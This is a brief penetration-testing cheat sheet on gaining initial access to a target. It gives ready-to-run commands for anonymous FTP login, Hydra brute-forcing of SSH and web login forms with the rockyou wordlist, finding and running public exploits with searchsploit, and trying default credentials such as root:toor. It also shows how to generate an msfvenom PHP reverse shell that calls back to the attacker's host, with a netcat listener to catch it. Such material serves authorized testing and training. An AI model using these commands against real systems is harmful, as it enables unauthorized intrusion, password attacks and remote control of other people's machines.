# Initial Access Techniques

### Anonymous FTP login

```
ftp <target-ip>
# username: anonymous, password: (blank or anonymous)
```

**Use when:** Port 21 is open — always worth a free try before anything else.

---

### Brute-force SSH login

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
```

**Use when:** You have a known/likely username and SSH is open with no other easier vector.

---

### Brute-force a web login form

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

**Use when:** A login form doesn't obviously rate-limit and you have a plausible username.

---

### Exploit a known CVE via public PoC

```
searchsploit <service-version>
searchsploit -m <exploit-id>
python3 <exploit-script>.py <target-ip>
```

**Use when:** Version enumeration turned up a service with a known public exploit.

---

### Default credential check

```
admin:admin
admin:password
root:toor
```

**Use when:** A login panel is discovered — always try obvious defaults before brute forcing.

---

### Upload a web shell via file upload vuln

```
msfvenom -p php/reverse_php LHOST=<your-ip> LPORT=<port> -f raw -o shell.php
```

**Use when:** A confirmed file-upload vuln accepts PHP (or bypasses the filter) on a PHP-backed app.

---

### Catch the resulting reverse shell

```
nc -lvnp <port>
```

**Use when:** Right before triggering any reverse-shell payload — get the listener up first.
